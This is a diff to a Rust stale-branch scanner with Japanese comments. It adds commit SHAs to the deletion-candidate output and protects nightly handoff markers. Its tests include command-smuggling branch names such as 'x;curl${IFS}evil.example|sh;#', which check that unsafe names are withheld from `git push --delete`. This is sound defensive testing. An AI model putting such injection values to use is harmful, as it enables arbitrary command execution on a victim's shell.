@@ -7,8 +7,9 @@
 //! ```
 //!
 //! `--prefix` は走査対象を絞る (例: `claude/nightly-`)。**PR の問い合わせ前**に効くので
-//! `gh` の呼び出し回数も減る。`--deletable-only` は markdown ではなく**削除候補のブランチ名を
-//! 1 行 1 件**で出す機械可読モードで、`nightly-todo.yml` の掃除 step が消費する。
+//! `gh` の呼び出し回数も減る。`--deletable-only` は markdown ではなく**削除候補を
+//! `<ブランチ名>\t<判定に使った commit>` の 1 行 1 件**で出す機械可読モードで、
+//! `nightly-todo.yml` の掃除 step が `cli-branch-cleanup` へそのまま流す。
 //!
 //! # なぜ takt workflow の中に置かないか
 //!
@@ -31,8 +32,10 @@
 //! 自動実行可クラスに入り、`nightly-todo.yml` の掃除 step が `--deletable-only` の出力を
 //! 消費して削除する ([ADR-072](../../../docs/adr/adr-072-nightly-todo-loop.md) 決定 20)。
 //! **判定と実行の分離は保たれている** — 本 exe は「消してよい」を決めるだけで、消すのは呼び手。
-//! `BranchVerdict::NoPullRequest` を候補にしない既存の規則が、そのまま夜間ループの
-//! 失敗マーカー (PR の無い `claude/nightly-<順位>`) を守る。
+//! `BranchVerdict::NoPullRequest` / `BranchVerdict::Diverged` を候補にしない規則が、
+//! そのまま夜間ループの失敗マーカー (base commit を指す空 ref の `claude/nightly-<順位>`) を
+//! 守る。**同名で過去に PR が出ていた順位も守るには commit の一致が要る** —
+//! [`classify::RemoteBranch`] の doc を参照。
 //!
 //! # 出力に wall-clock を含めない理由
 //!
@@ -49,7 +52,7 @@
 mod classify;
 mod collect;
 
-use classify::{BranchVerdict, ClassifiedBranch};
+use classify::{BranchVerdict, ClassifiedBranch, RemoteBranch};
 
 /// gh のために `GIT_DIR` を注入する。
 ///
@@ -167,14 +170,20 @@ fn main() {
     print!("{}", render(&classified, &cli.remote));
 }
 
-fn filter_by_prefix(branches: Vec<String>, prefix: Option<&str>) -> Vec<String> {
+fn filter_by_prefix(branches: Vec<RemoteBranch>, prefix: Option<&str>) -> Vec<RemoteBranch> {
     let Some(prefix) = prefix else {
         return branches;
     };
-    branches.into_iter().filter(|b| b.starts_with(prefix)).collect()
+    branches.into_iter().filter(|b| b.name.starts_with(prefix)).collect()
 }
 
-/// 削除候補のブランチ名だけを 1 行 1 件で返す (機械可読モード)。
+/// 削除候補を `<ブランチ名>\t<判定に使った commit>` の 1 行 1 件で返す (機械可読モード)。
+///
+/// **commit を添えるのは、実行側に「何を分類したか」を渡すため。** 削除するのは
+/// `cli-branch-cleanup` で、名前だけを渡すとあちらが**自分で観測し直した** ref を消す。
+/// 判定と実行の間に ref が動いていれば、それは本 exe が分類していない別の物である
+/// (夜間ループでは PR ブランチ → ハンドオフマーカーへの入れ替わりがこの形になる)。
+/// 区切りが tab なのは `git ls-remote` の出力形式に合わせたため。
 ///
 /// **名前が [`is_safe_branch_name`] を満たさないものは出さない。** 呼び手 (`nightly-todo.yml`)
 /// はこの出力を `git push origin --delete "$branch"` の引数に使うため、markdown レポートの
@@ -185,6 +194,8 @@ fn render_deletable(classified: &[ClassifiedBranch]) -> String {
     for branch in classify::deletion_candidates(classified) {
         if is_safe_branch_name(&branch.branch) {
             out.push_str(&branch.branch);
+            out.push('\t');
+            out.push_str(&branch.sha);
             out.push('\n');
             continue;
         }
@@ -299,14 +310,24 @@ fn render(classified: &[ClassifiedBranch], remote: &str) -> String {
         "PR",
     ));
     out.push_str(&section(
-        "## 参考: PR が 1 件も無いブランチ (提案対象外)",
+        "## 参考: ref が PR の head を指していないブランチ (提案対象外)",
         classified,
-        |verdict| matches!(verdict, BranchVerdict::NoPullRequest).then(|| "-".to_string()),
+        |verdict| match verdict {
+            BranchVerdict::NoPullRequest => Some("PR 無し".to_string()),
+            BranchVerdict::Diverged { settled_prs } => Some(format!(
+                "決着済み {} は別 commit を指す (ハンドオフマーカー等)",
+                settled_prs.iter().map(|n| format!("#{n}")).collect::<Vec<_>>().join(", ")
+            )),
+            _ => None,
+        },
         "備考",
     ));
     out.push_str(
         "> PR の無いブランチを提案対象にしないのは、**まだ PR を開いていない作業中のブランチ**と\n\
-         > 区別できないため。放置が気になる場合は人間が個別に判断する。\n",
+         > 区別できないため。**決着済み PR と同名でも、ref がその PR の head を指していなければ\n\
+         > 同じ扱い**にする — PR の履歴はブランチ名で永続するので、名前だけで束ねると後から\n\
+         > 作られた同名の ref (夜間ループのハンドオフマーカー) を消してしまう。\n\
+         > 放置が気になる場合は人間が個別に判断する。\n",
     );
     out
 }
@@ -314,7 +335,10 @@ fn render(classified: &[ClassifiedBranch], remote: &str) -> String {
 fn header(remote: &str) -> String {
     let mut out = String::from("# Stale Branch Watchlist (機械 scan)\n\n");
     out.push_str(&format!("- remote: `{remote}` / 対象: 全 remote ブランチ (trunk は常に除外)\n"));
-    out.push_str("- 判定: 紐づく PR がすべて closed / merged なら削除候補。open が 1 本でもあれば対象外\n");
+    out.push_str(
+        "- 判定: 紐づく PR がすべて closed / merged **かつ ref がその PR の head commit を\
+         指している**なら削除候補。open が 1 本でもあれば対象外\n",
+    );
     out.push_str("- **削除は行いません**。実行するかは人間が決めます (ADR-022 / ADR-028)\n\n");
     out
 }
@@ -410,14 +434,10 @@ fn section(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use classify::{PrRecord, PrState};
+    use classify::test_support::{branches, head_sha, pr};
 
     fn args(items: &[&str]) -> Vec<String> {
         items.iter().map(|s| s.to_string()).collect()
-    }
-
-    fn pr(number: u64, head: &str, state: &str) -> PrRecord {
-        PrRecord { number, head_ref: head.to_string(), state: PrState::parse(state) }
     }
 
     #[test]
@@ -468,16 +488,12 @@ mod tests {
     /// 対象にすればよく、無関係なブランチまで 1 本ずつ `gh` を呼ぶ理由がない。
     #[test]
     fn the_prefix_filters_branches_before_they_are_scanned() {
-        let branches = vec![
-            "claude/nightly-203".to_string(),
-            "claude/lane-model-pr4".to_string(),
-            "master".to_string(),
-        ];
+        let all = branches(&["claude/nightly-203", "claude/lane-model-pr4", "master"]);
         assert_eq!(
-            filter_by_prefix(branches.clone(), Some("claude/nightly-")),
-            vec!["claude/nightly-203".to_string()]
+            filter_by_prefix(all.clone(), Some("claude/nightly-")),
+            branches(&["claude/nightly-203"])
         );
-        assert_eq!(filter_by_prefix(branches.clone(), None), branches);
+        assert_eq!(filter_by_prefix(all.clone(), None), all);
     }
 
     /// 機械可読モードは **Stale だけ**を出す。とりわけ `NoPullRequest` を出さないことが
@@ -485,12 +501,12 @@ mod tests {
     #[test]
     fn the_machine_readable_output_lists_only_branches_whose_prs_are_all_settled() {
         let classified = classify::classify(
-            &[
-                "claude/nightly-203".to_string(),
-                "claude/nightly-228".to_string(),
-                "claude/nightly-240".to_string(),
-                "claude/nightly-999".to_string(),
-            ],
+            &branches(&[
+                "claude/nightly-203",
+                "claude/nightly-228",
+                "claude/nightly-240",
+                "claude/nightly-999",
+            ]),
             &[
                 pr(1, "claude/nightly-203", "CLOSED"),
                 pr(2, "claude/nightly-228", "MERGED"),
@@ -499,7 +515,15 @@ mod tests {
             None,
         );
         let out = render_deletable(&classified);
-        assert_eq!(out, "claude/nightly-203\nclaude/nightly-228\n");
+        assert_eq!(
+            out,
+            format!(
+                "claude/nightly-203\t{}\nclaude/nightly-228\t{}\n",
+                head_sha("claude/nightly-203"),
+                head_sha("claude/nightly-228")
+            ),
+            "削除候補は <ブランチ名>\\t<判定に使った commit> で出す"
+        );
         assert!(
             !out.contains("claude/nightly-999"),
             "PR の無いブランチ (失敗マーカー) を削除候補に出している"
@@ -516,21 +540,24 @@ mod tests {
     #[test]
     fn a_merged_pr_whose_branch_remains_is_a_deletion_candidate() {
         let classified = classify::classify(
-            &["claude/nightly-216".to_string()],
+            &branches(&["claude/nightly-216"]),
             &[pr(9, "claude/nightly-216", "MERGED")],
             None,
         );
-        assert_eq!(render_deletable(&classified), "claude/nightly-216\n");
+        assert_eq!(
+            render_deletable(&classified),
+            format!("claude/nightly-216\t{}\n", head_sha("claude/nightly-216"))
+        );
     }
 
     /// 呼び手は出力を `git push origin --delete "$branch"` に渡す。危険な文字を含む名前は
     /// 候補から落とす (markdown レポートのコピペ経路と同じ injection 面)。
     #[test]
     fn an_unsafe_branch_name_is_withheld_from_the_machine_readable_output() {
-        let hostile = "claude/nightly-1;curl evil".to_string();
+        let hostile = "claude/nightly-1;curl evil";
         let classified = classify::classify(
-            std::slice::from_ref(&hostile),
-            &[pr(1, &hostile, "CLOSED")],
+            &branches(&[hostile]),
+            &[pr(1, hostile, "CLOSED")],
             None,
         );
         assert_eq!(render_deletable(&classified), "");
@@ -542,12 +569,7 @@ mod tests {
     #[test]
     fn a_stale_branch_is_reported_with_a_manual_delete_command() {
         let classified = classify::classify(
-            &[
-                "claude/nightly-203".to_string(),
-                "master".to_string(),
-                "feat/live".to_string(),
-                "wip/no-pr".to_string(),
-            ],
+            &branches(&["claude/nightly-203", "master", "feat/live", "wip/no-pr"]),
             &[
                 pr(365, "claude/nightly-203", "CLOSED"),
                 pr(376, "feat/live", "OPEN"),
@@ -571,7 +593,7 @@ mod tests {
     #[test]
     fn a_branch_name_starting_with_dash_gets_a_double_dash_separator() {
         let classified = classify::classify(
-            &["--force".to_string()],
+            &branches(&["--force"]),
             &[pr(1, "--force", "CLOSED")],
             None,
         );
@@ -585,7 +607,7 @@ mod tests {
     fn a_branch_name_with_shell_metacharacters_gets_no_paste_ready_command() {
         let malicious = "x;curl${IFS}evil.example|sh;#";
         let classified = classify::classify(
-            &[malicious.to_string()],
+            &branches(&[malicious]),
             &[pr(1, malicious, "CLOSED")],
             None,
         );
@@ -605,7 +627,7 @@ mod tests {
         let active = "live`x`|y";
         let no_pr = "orphan`z`|w";
         let classified = classify::classify(
-            &[stale.to_string(), active.to_string(), no_pr.to_string()],
+            &branches(&[stale, active, no_pr]),
             &[pr(1, stale, "CLOSED"), pr(2, active, "OPEN")],
             None,
         );
@@ -632,14 +654,14 @@ mod tests {
         let report = render(&classify::classify(&[], &[], None), "origin");
         assert!(report.contains("0 件 (clean state)"), "{report}");
         assert!(report.contains("参考: open PR が生きているブランチ"), "{report}");
-        assert!(report.contains("参考: PR が 1 件も無いブランチ"), "{report}");
+        assert!(report.contains("参考: ref が PR の head を指していないブランチ"), "{report}");
     }
 
     /// 同じ入力なら同じ出力 (週次 diff 運用の前提)。wall-clock を混ぜていないことの回帰固定。
     #[test]
     fn the_report_is_byte_identical_for_the_same_input() {
         let classified = classify::classify(
-            &["feat/x".to_string()],
+            &branches(&["feat/x"]),
             &[pr(1, "feat/x", "MERGED")],
             None,
         );
